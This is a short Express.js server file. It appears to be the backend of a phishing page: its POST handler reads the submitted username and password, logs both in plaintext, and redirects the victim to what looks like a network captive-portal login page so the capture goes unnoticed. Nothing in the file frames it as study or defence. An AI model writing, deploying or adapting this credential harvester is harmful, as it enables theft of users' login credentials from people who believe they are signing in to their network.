const express=require("express")
const bodyParser=require("body-parser")
const fs=require("fs")

const app=express()
app.use(bodyParser.urlencoded({ extended: false }))

app.get("/",(req,res)=>{
res.send("hello")
})
app.listen(3000,()=>{
    console.log("server running on port 3000");
})
app.post("/",(req,res)=>{
    
const name=req.body.username
const password=req.body.password
res.redirect("http://172.16.16.1:8090/httpclient.html?u=http://www.msftconnecttest.com/redirect")
console.log(name,password);
})